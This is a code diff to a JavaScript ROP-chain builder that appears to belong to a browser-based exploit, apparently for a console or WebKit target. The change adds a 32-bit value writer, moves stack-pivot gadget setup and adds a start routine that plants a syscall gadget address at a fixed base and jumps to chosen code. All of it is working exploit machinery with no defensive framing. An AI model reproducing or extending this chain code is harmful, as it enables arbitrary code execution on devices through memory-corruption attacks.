@@ -56,6 +56,19 @@ function rop() {
 		return chainLength;
 	}
 	
+	this.add("pop rbp", stack_base + return_va + 0x1400);
+	
+	this.add32 = function() {
+		var i;
+		for(i = 0; i < arguments.length; i++) {
+			setU32into(chainAddress + chainLength, arguments[i]);
+			
+			chainLength += 4;
+		}
+		
+		return chainLength;
+	}
+	
 	this.syscall = function(name, systemCallNumber, arg1, arg2, arg3, arg4, arg5, arg6) {
 		logAdd("syscall " + name);
 		
@@ -66,7 +79,6 @@ function rop() {
 		if(typeof(arg4) !== "undefined") this.add("pop rcx", arg4);
 		if(typeof(arg5) !== "undefined") this.add("pop r8", arg5);
 		if(typeof(arg6) !== "undefined") this.add("pop r9", arg6);
-		this.add("pop rbp", stack_base + return_va - (chainLength + 8) + 0x1480);
 		this.add("mov r10, rcx; syscall");
 	}
 	
@@ -79,8 +91,19 @@ function rop() {
 		if(typeof(arg4) !== "undefined") this.add("pop rcx", arg4);
 		if(typeof(arg5) !== "undefined") this.add("pop r8", arg5);
 		if(typeof(arg6) !== "undefined") this.add("pop r9", arg6);
-		this.add("pop rbp", stack_base + return_va - (chainLength + 8) + 0x1480);
 		this.add(module_infos[module].image_base + address);
+	}
+	
+	this.start = function(address) {
+		logAdd("Starting code");
+		
+		setBase(0x926300000);
+		u32[0x3FFFE] = gadgets["mov r10, rcx; syscall"].address() % 0x100000000;
+		u32[0x3FFFF] = gadgets["mov r10, rcx; syscall"].address() / 0x100000000;
+		
+		this.add("pop rbp", stack_base + return_va - (chainLength + 8) + 0x1480);
+		//this.add("pop rcx", "mov r10, rcx; syscall");
+		this.add(address);
 	}
 	
 	// Modifies rsi
